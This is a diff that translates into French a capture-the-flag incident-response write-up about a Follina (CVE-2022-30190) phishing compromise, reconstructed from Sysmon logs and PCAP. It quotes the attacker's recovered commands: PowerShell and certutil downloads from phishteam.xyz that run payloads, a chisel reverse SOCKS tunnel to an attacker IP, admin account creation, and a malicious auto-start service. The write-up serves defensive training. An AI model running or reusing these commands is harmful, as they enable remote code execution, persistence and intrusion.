@@ -1,20 +1,23 @@
-# Case Study: Tempest — Investigating a Phishing-Based Intrusion with Sysmon and PowerShell
-The Tempest challenge simulated a phishing attack that led to a full system compromise through a malicious Microsoft Word document.
-This case study focused on event log analysis, PowerShell forensics, and correlating Sysmon data to reconstruct the attacker’s steps — from the initial infection vector to privilege escalation and persistence.
+# 📝 Étude de Cas : Tempest — Investigation d’une Intrusion par Phishing avec Sysmon et PowerShell
+
+Le challenge **Tempest** a simulé une attaque de phishing qui a conduit à une compromission complète du système via un document Microsoft Word malveillant.  
+Cette étude de cas se concentre sur **l’analyse des journaux d’événements, la forensique PowerShell et la corrélation des données Sysmon** pour reconstruire les étapes de l’attaquant — depuis le vecteur d’infection initial jusqu’à l’escalade de privilèges et la persistance.
 
 ---
 
-## Introduction and Environment Setup
-I started by connecting to the investigation Windows virtual machine and reviewing the Sysmon, Windows, and PCAP files located in the Incident Files directory.
-The investigation centered on identifying how a user named benimaru on host TEMPEST was compromised after opening a suspicious document attachment.
-To prepare, I listed all files and generated their SHA256 hashes using PowerShell:
+## Introduction et Configuration de l’Environnement
+J’ai commencé par me connecter à la machine virtuelle Windows d’investigation et examiner les fichiers **Sysmon, Windows et PCAP** situés dans le répertoire *Incident Files*.  
+L’enquête visait à déterminer comment l’utilisateur **benimaru** sur l’hôte **TEMPEST** a été compromis après avoir ouvert une pièce jointe suspecte.
 
+Pour préparer l’investigation, j’ai listé tous les fichiers et généré leurs **hash SHA256** avec PowerShell :
+
+powershell
 $Files = Get-ChildItem 'C:\Users\user\Desktop\Incident Files'
 ForEach($File in $Files) {
     Get-FileHash $File -Algorithm SHA256
 }
 
-This confirmed the integrity of the three main evidence files:
+Fichiers de preuve principaux :
 - capture.pcapng
 - sysmon.evtx
 - windows.evtx
@@ -23,94 +26,92 @@ This confirmed the integrity of the three main evidence files:
 
 ---
 
-## Identifying the Malicious Document
-By parsing Sysmon event logs, I searched for entries containing .doc references and discovered a suspicious document named free_magicules.doc.
-Further review revealed that this file originated from a phishing domain:
-- http://phishteam.xyz/02dcf07/free_magicules.doc
-Sysmon logs also showed the compromised user and host:
-- User: benimaru
-- Machine: TEMPEST
-The malicious document was opened by Microsoft Word (PID 496), which subsequently initiated a chain of PowerShell and MSDT activity — a key indicator of exploitation.
+## Identification du Document Malveillant
+En analysant les journaux Sysmon, j’ai recherché les entrées contenant des références .doc et découvert un document suspect nommé free_magicules.doc.
+Une analyse plus approfondie a révélé que ce fichier provenait d’un domaine de phishing :
+http://phishteam.xyz/02dcf07/free_magicules.doc
+Les journaux Sysmon ont également montré l’utilisateur et l’hôte compromis :
+Utilisateur : benimaru
+Machine : TEMPEST
+Le document malveillant a été ouvert par Microsoft Word (PID 496), ce qui a déclenché une chaîne d’exécution PowerShell et MSDT — un indicateur clé d’exploitation.
 
 ---
 
 
-## Discovering the Exploit and Payload Execution
-Within Sysmon logs, I found an encoded PowerShell command triggered through the MSDT utility:
+## Découverte de l’Exploit et Exécution du Payload
+Dans les journaux Sysmon, j’ai trouvé une commande PowerShell encodée déclenchée via l’utilitaire MSDT :
 - C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force ...
-Decoding the Base64 payload revealed:
+Décodage du payload Base64 :
 - $app=[Environment]::GetFolderPath('ApplicationData');
 - cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
 - iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
 - Expand-Archive .\update.zip -DestinationPath .;
 - rm update.zip;
-This confirmed the payload downloaded and extracted additional files into the Startup folder for persistence.
-The attack leveraged the MSDT (Follina) vulnerability — CVE-2022-30190 — to execute code remotely without macro execution.
+Cela confirme que le payload a téléchargé et extrait des fichiers supplémentaires dans le dossier Startup pour assurer la persistance.
+L’attaque exploitait la vulnérabilité MSDT (Follina) — CVE-2022-30190, permettant l’exécution de code à distance sans macros.
 
-## Persistence and Secondary Payloads
-The extracted payload placed a malicious shortcut at:
+## Persistance et Payloads Secondaires
+Le payload extrait a créé un raccourci malveillant à l’emplacement suivant :
 - C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk
-On user login, it executed a PowerShell command to download and run first.exe:
+À la connexion de l’utilisateur, il exécutait la commande PowerShell suivante pour télécharger et exécuter first.exe:
 - "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
-This file had a SHA256 hash of:
+Hash SHA256 de first.exe :
 - CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
-Sysmon network events showed that first.exe established outbound connections to:
+Les événements réseau Sysmon ont montré que first.exe établissait des connexions sortantes vers :
 - resolvecyber.xyz:80
-indicating a second-stage Command and Control (C2) channel.
+indiquant un canal de Command & Control (C2) secondaire.
 
 <img src="screenshots/tempest1.png" width="600">
 
-## Network Analysis and C2 Behavior
-Using Wireshark, I filtered HTTP traffic between the victim IP (192.168.254.107) and attacker IPs (167.71.199.191 / 167.71.222.162).
-The captured data revealed Base64-encoded HTTP requests to:
+## Analyse Réseau et Comportement C2
+Avec Wireshark, j’ai filtré le trafic HTTP entre l’IP victime (192.168.254.107) et les IP attaquants (167.71.199.191 / 167.71.222.162).
+Le trafic capturé montrait des requêtes HTTP encodées en Base64 vers :
 - http://phishteam.xyz/02dcf07/index.html
-The binary used parameter q to send encoded results and fetched new commands via:
-- /9ab62b5?
-using the HTTP GET method.
-The User-Agent header indicated the payload was written in Nim.
+Le binaire utilisait le paramètre q pour envoyer les résultats encodés et récupérer de nouvelles commandes via /9ab62b5? en GET.
+Le header User-Agent indiquait que le payload était écrit en Nim.
 
 <img src="screenshots/tempest2.png" width="600">
 
-## Discovery of Credentials and SOCKS Proxy Setup
-From decoded traffic, the attacker exfiltrated credentials found in a PowerShell script:
-- User: TEMPEST\benimaru
-- Password: infernotempest
-The attacker used these credentials to explore active connections and open ports — identifying port 5985 (WinRM) for remote shell access.
-To maintain access, they deployed a reverse SOCKS proxy using ch.exe, executed with:
+## Découverte des Identifiants et Proxy SOCKS
+À partir du trafic décodé, l’attaquant a exfiltré des identifiants trouvés dans un script PowerShell :
+- Utilisateur : TEMPEST\benimaru
+- Mot de passe : infernotempest
+Il a utilisé ces informations pour explorer les connexions actives et les ports ouverts, notamment le port 5985 (WinRM) pour un accès shell distant.
+Pour maintenir l’accès, un proxy SOCKS inversé a été déployé avec ch.exe :
 - C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
-Hash of the binary:
+Hash du binaire :
 - 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
-Tool identified as: chisel
+Outil identifié : chisel
 <img src="screenshots/tempest3.png" width="600">
 
-## Privilege Escalation and Persistence
-After lateral movement, the attacker downloaded another tool named spf.exe (hash 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D) — identified as PrintSpoofer.
-It abused the SeImpersonatePrivilege to escalate privileges to SYSTEM.
-Then the attacker executed final.exe, which reconnected to the C2 over port 8080.
+## Escalade de Privilèges et Persistance
+Après mouvement latéral, l’attaquant a téléchargé spf.exe (hash 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D) — identifié comme PrintSpoofer.
+Il a exploité la SeImpersonatePrivilege pour obtenir les privilèges SYSTEM.
+Ensuite, il a exécuté final.exe, qui a reconnecté le C2 sur le port 8080.
 
-## Account Creation and Persistence Mechanisms
-Once SYSTEM access was achieved, two new user accounts were created:
+## Création de Comptes et Mécanismes de Persistance
+Après avoir obtenu les privilèges SYSTEM, deux nouveaux comptes utilisateurs ont été créés :
 - shion, shuna
-Commands executed:
+Commandes exécutées :
 - net user shion /add
 - net user shuna /add
 - net localgroup administrators /add shion
-Relevant Event IDs:
-- 4720 → User account creation
-- 4732 → User added to local administrator group
-Finally, persistence was established through a malicious service:
+Événements pertinents :
+- 4720 → Création d’un compte utilisateur
+- 4732 → Ajout à un groupe administrateur local
+La persistance a été finalisée via un service malveillant :
 C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
 <img src="screenshots/tempest4.png" width="600">
 
-## Lessons Learned
-The Tempest challenge provided an excellent full-cycle SOC investigation experience, covering:
-- Event correlation using Sysmon and PowerShell.
-- Identifying phishing-based delivery and remote code execution (CVE-2022-30190).
-- Understanding persistence through startup entries and malicious services.
-- Tracking C2 communications and privilege escalation (PrintSpoofer).
-- Recognizing attacker TTPs aligned with MITRE ATT&CK tactics:
-  -- Execution (T1203)
-  -- Persistence (T1547)
-  -- Privilege Escalation (T1068)
-  -- Defense Evasion (T1070)
-This investigation strengthened my ability to analyze real-world intrusion data, extract actionable indicators, and build structured incident response workflows using native Windows telemetry and network captures.
+## Leçons Apprises
+Le challenge Tempest a fourni une expérience complète d’investigation SOC, couvrant :
+- Corrélation d’événements avec Sysmon et PowerShell
+- Identification de la livraison par phishing et de l’exécution de code à distance (CVE-2022-30190)
+- Compréhension de la persistance via raccourcis de démarrage et services malveillants
+- Suivi des communications C2 et de l’escalade de privilèges (PrintSpoofer)
+- Identification des TTP de l’attaquant selon le MITRE ATT&CK :
+ - Exécution (T1203) 
+ - Persistance (T1547)
+ - Escalade de privilèges (T1068)
+ - Évasion des défenses (T1070)
+Conclusion : cette enquête a renforcé ma capacité à analyser des intrusions réelles, extraire des IOCs exploitables et construire des workflows structurés de réponse aux incidents en utilisant la télémétrie native Windows et les captures réseau.
